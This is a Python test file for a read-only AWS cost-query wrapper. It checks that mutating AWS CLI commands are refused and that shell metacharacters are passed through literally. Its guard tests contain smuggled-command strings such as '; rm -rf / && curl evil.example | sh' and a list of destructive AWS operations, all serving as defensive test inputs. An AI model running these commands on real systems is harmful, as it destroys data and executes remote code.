"""Tests for nr2grafana.awscost -- the read-only AWS discovery layer.

The read-only guard is the most important thing under test: adversarial
mutating / non-allow-listed commands MUST be refused before any exec,
and no argument may smuggle a second command or a live shell
metacharacter (we run shell=False + argv).
"""

import json
import os
import stat
import subprocess
import tempfile
import textwrap
import unittest
from unittest import mock

from nr2grafana import awscost
from nr2grafana.awscost import (ALLOWED, AWSError, READONLY_VERBS,
                                aws_available, caller_identity,
                                get_anomalies, get_cost_and_usage,
                                get_cost_forecast, run_aws,
                                s3_bucket_sizes)


# A fake ``aws`` CLI: records the argv it was given and prints canned
# JSON depending on the (service, subcommand). Used via N2G_AWS_BIN so
# the real argv construction and JSON parsing are exercised end to end.
FAKE_AWS = textwrap.dedent('''\
    #!/usr/bin/env python3
    import json, os, sys
    argv = sys.argv[1:]
    log = os.environ.get("N2G_FAKE_LOG")
    if log:
        with open(log, "w") as fh:
            fh.write("\\0".join(argv))
    # Skip global options to find service + subcommand.
    pos = []
    i = 0
    skip_val = {"--output", "--region", "--profile"}
    while i < len(argv):
        a = argv[i]
        if a in skip_val:
            i += 2
            continue
        if a.startswith("--"):
            break
        pos.append(a)
        i += 1
    service = pos[0] if pos else ""
    sub = pos[1] if len(pos) > 1 else ""
    if (service, sub) == ("sts", "get-caller-identity"):
        print(json.dumps({"Account": "123456789012",
                          "Arn": "arn:aws:iam::123456789012:user/ro",
                          "UserId": "AIDAEXAMPLE"}))
    elif (service, sub) == ("ce", "get-cost-and-usage"):
        print(json.dumps({"ResultsByTime": [
            {"TimePeriod": {"Start": "2026-06-01", "End": "2026-07-01"},
             "Total": {"UnblendedCost": {"Amount": "100.0",
                                         "Unit": "USD"}}}]}))
    elif (service, sub) == ("ce", "get-cost-forecast"):
        print(json.dumps({"Total": {"Amount": "120.0", "Unit": "USD"}}))
    elif (service, sub) == ("ce", "get-anomalies"):
        print(json.dumps({"Anomalies": [{"AnomalyId": "a-1"}]}))
    elif (service, sub) == ("cloudwatch", "get-metric-statistics"):
        mn = ""
        if "--metric-name" in argv:
            mn = argv[argv.index("--metric-name") + 1]
        val = 42.0 if mn == "BucketSizeBytes" else 7.0
        print(json.dumps({"Datapoints": [
            {"Timestamp": "2026-08-01T00:00:00Z", "Average": val}]}))
    else:
        sys.stderr.write("fake aws: unhandled %s %s\\n" % (service, sub))
        sys.exit(254)
''')


def _completed(stdout=b"", stderr=b"", returncode=0):
    """Build a fake CompletedProcess-like object for subprocess.run."""
    obj = mock.Mock()
    obj.stdout = stdout
    obj.stderr = stderr
    obj.returncode = returncode
    return obj


class FakeAwsMixin(unittest.TestCase):
    """Installs a real fake ``aws`` script pointed to by N2G_AWS_BIN."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.path = os.path.join(self.tmp, "fake_aws.py")
        with open(self.path, "w") as fh:
            fh.write(FAKE_AWS)
        os.chmod(self.path, os.stat(self.path).st_mode | stat.S_IEXEC)
        self.log = os.path.join(self.tmp, "argv.log")
        self._env = mock.patch.dict(
            os.environ,
            {"N2G_AWS_BIN": self.path, "N2G_FAKE_LOG": self.log})
        self._env.start()

    def tearDown(self):
        self._env.stop()

    def recorded_argv(self):
        with open(self.log) as fh:
            return fh.read().split("\x00")


class GuardTests(unittest.TestCase):
    """Adversarial guard: mutating / non-allow-listed = refused."""

    MUTATING = [
        ("ce", "create-anomaly-monitor"),
        ("ce", "delete-anomaly-monitor"),
        ("ce", "update-anomaly-monitor"),
        ("ec2", "terminate-instances"),
        ("ec2", "run-instances"),
        ("ec2", "stop-instances"),
        ("s3api", "delete-bucket"),
        ("s3api", "put-object"),
        ("iam", "create-user"),
        ("iam", "delete-user"),
        ("organizations", "leave-organization"),
        ("sts", "assume-role"),
    ]

    def test_mutating_commands_refused_before_exec(self):
        for service, sub in self.MUTATING:
            with mock.patch("subprocess.run") as run:
                with self.assertRaises(AWSError) as ctx:
                    run_aws(service, sub)
                self.assertIn("refused", str(ctx.exception).lower())
                run.assert_not_called()

    def test_unknown_service_refused(self):
        with mock.patch("subprocess.run") as run:
            with self.assertRaises(AWSError):
                run_aws("lambda", "list-functions")
            run.assert_not_called()

    def test_subcommand_not_in_allow_list_refused(self):
        # A read-only-looking verb on an allow-listed service, but not in
        # the set, is still refused (exact membership, not prefix guess).
        with mock.patch("subprocess.run") as run:
            with self.assertRaises(AWSError):
                run_aws("ec2", "describe-volumes")
            run.assert_not_called()

    def test_subcommand_smuggling_second_command_refused(self):
        # Trying to append a second command onto the subcommand string
        # fails exact allow-list membership -> refused before exec.
        with mock.patch("subprocess.run") as run:
            with self.assertRaises(AWSError):
                run_aws("ce", "get-cost-and-usage; rm -rf /")
            run.assert_not_called()

    def test_every_allowed_subcommand_is_readonly(self):
        # Structural invariant: nothing in the allow-list is a write verb.
        for service, subs in ALLOWED.items():
            for sub in subs:
                self.assertTrue(
                    sub.startswith(READONLY_VERBS),
                    "%s %s is not a read-only verb" % (service, sub))

    def test_case_variant_not_allowed(self):
        with mock.patch("subprocess.run") as run:
            with self.assertRaises(AWSError):
                run_aws("EC2", "Describe-Instances")
            run.assert_not_called()


class ArgSmugglingTests(unittest.TestCase):
    """Args cannot smuggle a second command or a live metacharacter."""

    def test_shell_metacharacters_passed_literally_not_executed(self):
        # An allow-listed read command with a nasty arg: because we run
        # shell=False + argv, the metacharacters land as ONE literal argv
        # element and cannot spawn a second process.
        evil = "; rm -rf / && curl evil.example | sh"
        captured = {}

        def fake_run(argv, **kw):
            captured["argv"] = argv
            captured["shell"] = kw.get("shell")
            return _completed(stdout=b"{}")

        with mock.patch("subprocess.run", side_effect=fake_run):
            run_aws("ce", "get-dimension-values", [evil])
        self.assertFalse(captured["shell"])
        # The evil string survives as exactly one argv element, verbatim.
        self.assertIn(evil, captured["argv"])
        self.assertEqual(captured["argv"].count(evil), 1)

    def test_control_character_argument_refused(self):
        with mock.patch("subprocess.run") as run:
            with self.assertRaises(AWSError):
                run_aws("ce", "get-tags", ["a\nb"])
            run.assert_not_called()

    def test_nul_argument_refused(self):
        with mock.patch("subprocess.run") as run:
            with self.assertRaises(AWSError):
                run_aws("ce", "get-tags", ["a\x00b"])
            run.assert_not_called()

    def test_non_string_argument_refused(self):
        with mock.patch("subprocess.run") as run:
            with self.assertRaises(AWSError):
                run_aws("ce", "get-tags", [123])
            run.assert_not_called()

    def test_control_character_in_region_refused(self):
        with mock.patch("subprocess.run") as run:
            with self.assertRaises(AWSError):
                run_aws("sts", "get-caller-identity", region="us\n-1")
            run.assert_not_called()


class RunAwsExecTests(unittest.TestCase):
    """Argv construction, JSON parsing and error mapping."""

    def test_forces_output_json_and_shell_false(self):
        captured = {}

        def fake_run(argv, **kw):
            captured["argv"] = argv
            captured["shell"] = kw.get("shell")
            captured["stdin"] = kw.get("stdin")
            return _completed(stdout=b'{"ok": true}')

        with mock.patch("subprocess.run", side_effect=fake_run):
            out = run_aws("ce", "get-cost-and-usage",
                          ["--granularity", "MONTHLY"],
                          region="eu-west-1", profile="prod")
        self.assertEqual(out, {"ok": True})
        self.assertFalse(captured["shell"])
        self.assertEqual(captured["stdin"], subprocess.DEVNULL)
        argv = captured["argv"]
        self.assertIn("--output", argv)
        self.assertEqual(argv[argv.index("--output") + 1], "json")
        self.assertEqual(argv[argv.index("--region") + 1], "eu-west-1")
        self.assertEqual(argv[argv.index("--profile") + 1], "prod")
        # service/subcommand present and in order after global options.
        self.assertIn("ce", argv)
        self.assertIn("get-cost-and-usage", argv)
        self.assertLess(argv.index("ce"), argv.index("get-cost-and-usage"))

    def test_no_profile_flag_when_profile_blank(self):
        captured = {}

        def fake_run(argv, **kw):
            captured["argv"] = argv
            return _completed(stdout=b"{}")

        with mock.patch("subprocess.run", side_effect=fake_run):
            run_aws("sts", "get-caller-identity")
        self.assertNotIn("--profile", captured["argv"])

    def test_empty_stdout_returns_empty_dict(self):
        with mock.patch("subprocess.run",
                        return_value=_completed(stdout=b"   ")):
            self.assertEqual(run_aws("sts", "get-caller-identity"), {})

    def test_non_json_stdout_raises(self):
        with mock.patch("subprocess.run",
                        return_value=_completed(stdout=b"not json")):
            with self.assertRaises(AWSError) as ctx:
                run_aws("ce", "get-tags")
            self.assertIn("not JSON", str(ctx.exception))

    def test_missing_binary_actionable_error(self):
        with mock.patch.dict(os.environ, {"N2G_AWS_BIN": ""}):
            with mock.patch("nr2grafana.awscost._aws_bin",
                            return_value=None):
                with self.assertRaises(AWSError) as ctx:
                    run_aws("sts", "get-caller-identity")
        self.assertIn("aws", str(ctx.exception).lower())

    def test_not_configured_error_mapped(self):
        err = (b"Unable to locate credentials. You can configure "
               b"credentials by running \"aws configure\".")
        with mock.patch("subprocess.run",
                        return_value=_completed(stderr=err, returncode=255)):
            with self.assertRaises(AWSError) as ctx:
                run_aws("ce", "get-cost-and-usage")
        self.assertIn("not configured", str(ctx.exception).lower())

    def test_access_denied_error_mapped(self):
        err = (b"An error occurred (AccessDeniedException) when calling "
               b"the GetCostAndUsage operation: not authorized")
        with mock.patch("subprocess.run",
                        return_value=_completed(stderr=err, returncode=255)):
            with self.assertRaises(AWSError) as ctx:
                run_aws("ce", "get-cost-and-usage")
        self.assertIn("access denied", str(ctx.exception).lower())

    def test_throttling_error_mapped(self):
        err = (b"An error occurred (ThrottlingException): Rate exceeded")
        with mock.patch("subprocess.run",
                        return_value=_completed(stderr=err, returncode=255)):
            with self.assertRaises(AWSError) as ctx:
                run_aws("ce", "get-cost-and-usage")
        self.assertIn("throttl", str(ctx.exception).lower())

    def test_timeout_actionable_error(self):
        with mock.patch("subprocess.run",
                        side_effect=subprocess.TimeoutExpired("aws", 1)):
            with self.assertRaises(AWSError) as ctx:
                run_aws("ce", "get-cost-and-usage")
        self.assertIn("timed out", str(ctx.exception).lower())

    def test_file_not_found_at_exec_actionable(self):
        with mock.patch("nr2grafana.awscost._aws_bin",
                        return_value="/no/such/aws"):
            with mock.patch("subprocess.run",
                            side_effect=FileNotFoundError()):
                with self.assertRaises(AWSError):
                    run_aws("sts", "get-caller-identity")


class FakeAwsEndToEndTests(FakeAwsMixin):
    """Exercise the real binary path via N2G_AWS_BIN."""

    def test_aws_available_true_with_override(self):
        self.assertTrue(aws_available())

    def test_caller_identity_parsed(self):
        ident = caller_identity()
        self.assertEqual(ident["Account"], "123456789012")
        self.assertIn("iam", ident["Arn"])

    def test_get_cost_and_usage_parsed_and_argv(self):
        out = get_cost_and_usage(
            "2026-06-01", "2026-07-01", group_by="SERVICE",
            filt={"Dimensions": {"Key": "REGION",
                                 "Values": ["us-east-1"]}})
        self.assertIn("ResultsByTime", out)
        argv = self.recorded_argv()
        self.assertIn("--time-period", argv)
        self.assertIn("Start=2026-06-01,End=2026-07-01", argv)
        self.assertIn("Type=DIMENSION,Key=SERVICE", argv)
        self.assertIn("--filter", argv)
        self.assertIn("UnblendedCost", argv)

    def test_get_cost_forecast_parsed(self):
        out = get_cost_forecast("2026-09-01", "2026-12-01")
        self.assertEqual(out["Total"]["Amount"], "120.0")

    def test_get_anomalies_returns_list(self):
        anomalies = get_anomalies("2026-06-01", "2026-08-01")
        self.assertEqual(anomalies, [{"AnomalyId": "a-1"}])
        argv = self.recorded_argv()
        self.assertIn("--date-interval", argv)
        self.assertIn("StartDate=2026-06-01,EndDate=2026-08-01", argv)

    def test_s3_bucket_sizes_via_cloudwatch(self):
        sizes = s3_bucket_sizes(["mimir-blocks", "loki-chunks"])
        self.assertEqual(sizes["mimir-blocks"]["bytes"], 42.0)
        self.assertEqual(sizes["mimir-blocks"]["objects"], 7.0)
        self.assertIn("loki-chunks", sizes)

    def test_mutating_still_refused_with_real_binary(self):
        # Even with a working binary available, the guard refuses first.
        with self.assertRaises(AWSError):
            run_aws("ec2", "terminate-instances", ["--instance-ids", "i-1"])


class MiscTests(unittest.TestCase):
    def test_aws_available_false_when_nothing_found(self):
        with mock.patch("nr2grafana.awscost.shutil.which",
                        return_value=None):
            with mock.patch.dict(os.environ, {"N2G_AWS_BIN": ""}):
                self.assertFalse(aws_available())

    def test_s3_bucket_sizes_records_error_per_bucket(self):
        with mock.patch("nr2grafana.awscost.run_aws",
                        side_effect=AWSError("boom")):
            out = s3_bucket_sizes(["b1"])
        self.assertIn("error", out["b1"])
        self.assertIsNone(out["b1"]["bytes"])


if __name__ == "__main__":
    unittest.main()
